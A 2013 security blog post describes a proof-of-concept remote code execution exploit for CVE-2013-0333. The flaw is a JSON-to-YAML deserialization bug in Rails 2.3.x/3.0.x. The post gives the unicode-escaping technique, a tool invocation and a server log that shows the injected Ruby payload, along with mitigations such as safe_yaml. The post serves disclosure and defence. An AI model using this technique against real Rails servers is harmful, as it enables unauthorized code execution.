---
layout: post
title: Rails PoC exploit for CVE-2013-0333
author: postmodern
tags:
 - rails
 - ronin
 - poc
 - exploit
---

**TL;DR:** Same YAML [vulnerability][1], different code-path.

* [rails_omakase.rb]

Hot on the heels of [CVE-2013-0156], [CVE-2013-0333] was announced.
A code-path was discovered that allows `text/json` requests to be
translated into and parsed as YAML. This behavior _only_ exists in
Rails 2.3.x and 3.0.x.
 
This exploit uses the same YAML deserialization technique as the previous
[Rails PoC exploit][rails_rce.rb]. Please see the previous [write-up][1] for a
detailed explanation of how to achieve Remote Code Execution (RCE) via
`YAML.load`.

## ActiveSupport::JSON

In Rails 3.0.x, [ActiveSupport::JSON] acts as a proxy to various JSON parsing
libraries. By default Rails 3.0.x provides the [JSONGem], [Yajl] and [Yaml]
backends. [JSONGem] uses the [json] gem, [Yajl] uses the high-performance
[yajl] JSON parser, and [Yaml] attempts to translate JSON into YAML
before passing it to `YAML.load`. Oddly enough, [Yaml] (and not [JSONGem])
is the default JSON backend in Rails 3.0.x:

{% highlight ruby %}
ActiveSupport::JSON.backend
# => ActiveSupport::JSON::Backends::Yaml
{% endhighlight %}

The problem with the [Yaml] backend is that it's [convert_json_to_yaml] method
is incredibly naive. The method uses [StringScanner] to walk through the JSON
string, replacing JSON tokens with their YAML equivalents. The method does not
fully parse the JSON in order to emit proper YAML, nor does it validate that
the input is actually valid JSON. This is our opening.

However, [convert_json_to_yaml] does replace all `:` characters with `: `,
in an attempt to convert JSON Hashes into YAML Hashes. This will corrupt
our YAML tags:

{% highlight ruby %}
yaml = "--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection"
ActiveSupport::JSON::Backends::Yaml.send(:convert_json_to_yaml,yaml)
# => "--- !ruby/hash: ActionController: : Routing: : RouteSet: : NamedRouteCollection"
{% endhighlight %}

Luckily, [convert_json_to_yaml] also parses JSON unicode-escaped characters:

{% highlight ruby %}
ActiveSupport::JSON::Backends::Yaml.send(:convert_json_to_yaml,yaml.gsub(':','\u003a'))
# => "--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection"
{% endhighlight %}

Now to get the YAML payload from [rails_rce.rb] executing. The `module_eval`ed
code in [ActionController::Routing::RouteSet::NamedRouteCollection#define_hash_access][define_hash_access 3.0.x]
was similar to that of Rails 2.8.x, and was changed in [Rails 3.1.x][define_hash_access 3.1.x].
Due to this difference, we simply reused the Rails 2.x payload from the
[rails_rce.rb] exploit.

After some minor modifications to [rails_rce.rb] we had a working exploit:

    $ rails_omakase http://localhost:3000/secrets "puts 'lol'"

    lol
    
    Started POST "/secrets" for 127.0.0.1 at 2013-01-28 18:53:18 -0800
      Processing by SecretsController#show as 
      Parameters: {"_json"=>#<ActionDispatch::Routing::RouteSet::NamedRouteCollection:0x00000002221080 @routes={:"foo\nend\n(puts 'lol'; @executed = true) unless @executed\n__END__\n"=>#<struct defaults={:action=>"create", :controller=>"foos"}, required_parts=[], requirements={:action=>"create", :controller=>"foos"}, segment_keys=[:format]>}, @helpers=[:"hash_for_foo\nend\n(puts 'lol'; @executed = true) unless @executed\n__END__\n_url", :"foo\nend\n(puts 'lol'; @executed = true) unless @executed\n__END__\n_url", :"hash_for_foo\nend\n(puts 'lol'; @executed = true) unless @executed\n__END__\n_path", :"foo\nend\n(puts 'lol'; @executed = true) unless @executed\n__END__\n_path"], @module=#<Module:0x00000002220fb8>>}
    Rendered text template (0.0ms)
    Completed 200 OK in 2ms (Views: 1.4ms | ActiveRecord: 0.0ms)

## Again?

When Rails was updated for [CVE-2013-0156], it did not actually fix the
underlying root cause, that the [Psych][psych] YAML parser
[does not have a safe-mode][5]. As long as developers continue allowing
user-input near `YAML.load`, and there is no safe-mode to prevent YAML from
deserializing arbitrary Classes, YAML deserialization vulnerabilities will
continue to pop up. In the meantime, there is a [safe_yaml] library, which
provides a safe-mode and does prevent [rails_omakase.rb] from working:

    Started POST "/secrets" for 127.0.0.1 at 2013-01-28 21:34:37 -0800
      Processing by SecretsController#show as 
      Parameters: {"foo\nend\n(puts 'lol'; @executed = true) unless @executed\n__END__\n"=>{"defaults"=>{":action"=>"create", ":controller"=>"foos"}, "required_parts"=>nil, "requirements"=>{":action"=>"create", ":controller"=>"foos"}, "segment_keys"=>[":format"]}}
    Rendered text template (0.0ms)
    Completed 200 OK in 2ms (Views: 1.2ms | ActiveRecord: 0.0ms)

**Update:** [@nelhage] has also written a [monkey-patch][6] for YAML,
that prevents any non-primitive objects from being deserialized. I have tested
this workaround against [rails_omakase.rb] on Ruby 1.9.3-p362 and Rails 3.0.19,
and can confirm it prevents the exploit from working. However, once loaded
it effects all `YAML.load` calls and cannot be disabled.

## Omakase?

I named this exploit [rails_omakase.rb], as an ode to [Rails Is Omakase][2];
I highly recommend the [dramatic reading][3]. In the blog post,
David Heinemeier Hansson (DHH) discusses the criticism Rails Core has received
over their changes to default settings. His main complaint is that merely
complaining about the changes, and not contributing code, does not improve the 
development process of Rails.

This vulnerability was the result of [changing the default JSON backend][4] from
[JSONGem] to [Yaml]. Additionally, it is unclear why anyone would ever
consider attempting to convert JSON into YAML, without fully parsing it first.
Like wise, [CVE-2013-0156] is equally perplexing, who could possibly think any
good would come from embedding YAML in XML?

Despite DHH's reassurance that Rails Core has the best of intentions when they
change default settings, they can and do make mistakes.

[CVE-2013-0156]: https://groups.google.com/forum/?fromgroups=#!topic/rubyonrails-security/61bkgvnSGTQ
[CVE-2013-0333]: https://groups.google.com/forum/?fromgroups=#!topic/rubyonrails-security/1h2DR63ViGo

[rails_omakase.rb]: https://gist.github.com/4660248
[rails_rce.rb]: https://gist.github.com/4499206

[json]: http://flori.github.com/json/
[yajl]: http://lloyd.github.com/yajl/
[psych]: https://github.com/tenderlove/psych
[safe_yaml]: https://github.com/dtao/safe_yaml#readme

[StringScanner]: http://rubydoc.info/stdlib/strscan/StringScanner
[ActiveSupport::JSON]: https://github.com/rails/rails/blob/v3.0.19/activesupport/lib/active_support/json/decoding.rb
[JSONGem]: https://github.com/rails/rails/blob/v3.0.19/activesupport/lib/active_support/json/backends/jsongem.rb
[Yajl]: https://github.com/rails/rails/blob/v3.0.19/activesupport/lib/active_support/json/backends/yajl.rb
[Yaml]: https://github.com/rails/rails/blob/v3.0.19/activesupport/lib/active_support/json/backends/yaml.rb
[convert_json_to_yaml]: https://github.com/rails/rails/blob/v3.0.19/activesupport/lib/active_support/json/backends/yaml.rb#L29-L96
[define_hash_access 3.0.x]: https://github.com/rails/rails/blob/v3.0.19/actionpack/lib/action_dispatch/routing/route_set.rb#L166-L171
[define_hash_access 3.1.x]: https://github.com/rails/rails/blob/v3.1.0/actionpack/lib/action_dispatch/routing/route_set.rb#L166-L171

[1]: /blog/2013/01/09/rails-pocs.html
[2]: http://david.heinemeierhansson.com/2012/rails-is-omakase.html
[3]: http://gilesbowkett.blogspot.com/2013/01/a-dramatic-reading-of-rails-is-omakase.html
[4]: https://github.com/rails/rails/commit/a87683fb38d6cf66f39a7bd3faa6c969c63b1f46
[5]: https://github.com/tenderlove/psych/issues/119
[6]: https://gist.github.com/4659489

[@nelhage]: https://twitter.com/nelhage
